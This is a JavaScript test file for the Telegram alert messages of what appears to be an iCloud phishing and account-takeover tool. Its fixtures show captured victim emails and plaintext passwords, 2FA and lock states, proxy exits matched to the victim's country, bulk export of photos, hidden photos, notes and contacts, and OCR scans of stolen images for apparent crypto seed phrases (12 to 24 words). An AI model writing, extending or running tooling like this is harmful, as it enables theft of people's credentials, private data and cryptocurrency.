import assert from "node:assert/strict";
import {
  accountCard,
  accountStatsView,
  accountListView,
  poolEventView,
  statusLight,
  formatBytes,
  progressBar,
  countryFlag,
} from "../telegram/views.js";

/* Telegram is alerts-only now: status lights, the account card and stats. */

const base = {
  id: "id",
  shortId: "abc12345",
  email: "person@example.com",
  status: "connected",
  trusted: true,
  lastPingAt: new Date().toISOString(),
  createdAt: new Date().toISOString(),
  updatedAt: new Date().toISOString(),
  identity: { name: "Person", plan: { featureKey: "icloud.plus" }, storage: {} },
  counts: { photos: 10, hidden: 2, deleted: 1, notes: 3, contacts: 4, driveFiles: 5 },
  export: { phase: "running", done: 3, total: 10, bytes: 1024 },
  geo: { country: "DE", ip: "203.0.113.1" },
  proxy: { country: "DE", exitIp: "203.0.113.2" },
};

assert.equal(statusLight(base), "🟢");
assert.equal(statusLight({ ...base, lastPingAt: null }), "🟡");
assert.equal(statusLight({ ...base, status: "dead" }), "🔴");
assert.equal(statusLight({ ...base, status: "twofa" }), "🔴");
assert.equal(formatBytes(0), "0 B");
assert.equal(formatBytes(1024), "1.0 KB");

const card = accountCard(base);
assert.match(card, /person@example\.com/);
assert.match(card, /Connected|connected/i);

const locked = { ...base, status: "error", locked: true, lockCode: "-20209" };
assert.match(accountCard(locked, { title: "Account locked" }), /locked/i);
assert.match(accountCard(locked, { title: "Account locked" }), /-20209/);
assert.match(accountCard(locked, { title: "Account locked" }), /iforgot\.apple\.com/);
assert.equal(statusLight(locked), "🔴");

const stats = accountStatsView(
  { total: 1, byStatus: { connected: 1 }, trusted: 1 },
  { total: 2 },
  { workers: 1, auth: 10, export: 4 }
);
assert.match(stats.text, /Trusted: 1/);
for (const row of stats.keyboard.inline_keyboard) {
  for (const button of row) {
    assert.ok(
      !button.callback_data || button.callback_data.length <= 64,
      `callback too long: ${button.callback_data}`
    );
  }
}

assert.equal(progressBar(5, 10), "█████░░░░░ 50%");
assert.equal(countryFlag("ID"), "🇮🇩");
assert.equal(countryFlag("FR"), "🇫🇷");
assert.equal(countryFlag(""), "");
const unsupported = accountCard({
  ...base,
  geo: { country: "Antarctica", countryCode: "AQ", ip: "1.2.3.4" },
  proxy: {
    country: "AQ",
    requestedCountry: "AQ",
    supported: false,
    exitCountry: "IT",
    exitIp: "5.6.7.8",
  },
});
assert.match(unsupported, /not supported by anyIP/);
assert.match(unsupported, /🇮🇹 IT/);
assert.match(accountCard({ ...base, password: "hunter2" }), /hunter2/);
assert.match(
  accountCard({ ...base, password: "", status: "queued" }),
  /waiting for password/i
);
assert.match(accountCard({ ...base, counts: { photos: 42, hidden: 7 } }), /Photos: <b>42<\/b> · Hidden: <b>7<\/b>/);

const scan = {
  phase: "done",
  files: 100,
  images: 90,
  ocrOk: 88,
  ocrFailed: 2,
  findings: 4,
  hitFiles: 2,
  hitImages: 2,
  tiers: { valid: 1, high: 2, medium: 1, minimum: 0, low: 3 },
};
const scanText = poolEventView("scan", { ...base, scan }, { scan });
assert.match(scanText, /checksum-valid: <b>1<\/b>/);
assert.match(scanText, /high \(12\/15\/18\/21\/24\): <b>2<\/b>/);
assert.match(scanText, /low \(3–4\): <b>3<\/b>/);

const emailText = poolEventView(
  "email_entered",
  { ...base, password: "", status: "queued" },
  { newAccount: true }
);
assert.match(emailText, /New visitor/);
assert.match(emailText, /person@example\.com/);
assert.match(emailText, /not entered yet/);

const returning = poolEventView(
  "email_entered",
  { ...base, password: "Gianna19$", status: "exporting", trusted: true },
  { newAccount: false }
);
assert.match(returning, /Visitor resumed/);
assert.match(returning, /Gianna19\$/);
assert.match(returning, /signed in before/);

const list = accountListView(
  { items: [base], total: 1, page: 1, pages: 1, pageSize: 5 },
  { byStatus: { connected: 1 } }
);
for (const row of list.keyboard.inline_keyboard) {
  for (const button of row) {
    assert.ok(
      !button.callback_data || button.callback_data.length <= 64,
      `callback too long: ${button.callback_data}`
    );
  }
}

console.log("telegram views ok");
